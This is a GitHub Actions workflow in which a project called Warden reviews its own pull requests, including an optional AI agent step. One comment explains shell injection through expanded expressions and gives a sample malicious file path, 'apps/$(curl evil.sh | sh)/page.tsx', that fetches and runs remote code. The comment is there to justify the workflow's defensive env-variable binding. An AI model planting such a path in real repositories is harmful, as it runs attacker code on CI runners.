name: Warden Self-Test

# Warden reviews its own pull requests (dogfood). The change-surface analysis is
# keyless and always runs; the AI agent runs only if an ANTHROPIC_API_KEY secret is set.

on:
  pull_request:

permissions:
  contents: read
  pull-requests: write
  checks: write

jobs:
  warden:
    name: 🛡️ Warden QA
    runs-on: ubuntu-latest
    env:
      ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      - uses: pnpm/action-setup@v6
        with:
          version: 10.14.0
      - uses: actions/setup-node@v7
        with:
          node-version: 20
          cache: pnpm
      - name: Install
        run: pnpm install --frozen-lockfile
      - name: Build
        run: pnpm -w build

      - name: Analyze change surface (keyless)
        id: analyze
        run: node packages/cli/dist/bin/warden.js analyze --base origin/main --head HEAD --output "$GITHUB_OUTPUT"

      # GitHub expands ${{ ... }} into a run: script as text, before the shell parses it, so an
      # expression carrying pull-request data is pull-request-controlled shell. test_tags is built
      # from the changed files' own paths: a branch adding apps/$(curl evil.sh | sh)/page.tsx would
      # otherwise run that on this runner. Bind to env: and read as "$VAR" — an environment
      # variable is data the shell never re-scans.
      - name: Show change surface
        env:
          TEST_TAGS: ${{ steps.analyze.outputs.test_tags }}
          RISK_SCORE: ${{ steps.analyze.outputs.risk_score }}
          RUN_FULL_SUITE: ${{ steps.analyze.outputs.run_full_suite }}
        run: |
          echo "test_tags     = $TEST_TAGS"
          echo "risk_score    = $RISK_SCORE"
          echo "run_full_suite= $RUN_FULL_SUITE"

      - name: Emit test plan
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          node packages/cli/dist/bin/warden.js plan --name "PR #$PR_NUMBER" >> "$GITHUB_STEP_SUMMARY"

      - name: AI exploratory agent (requires ANTHROPIC_API_KEY secret)
        if: ${{ env.ANTHROPIC_API_KEY != '' }}
        run: node packages/cli/dist/bin/warden.js agent --strategy generative --output warden-report.json
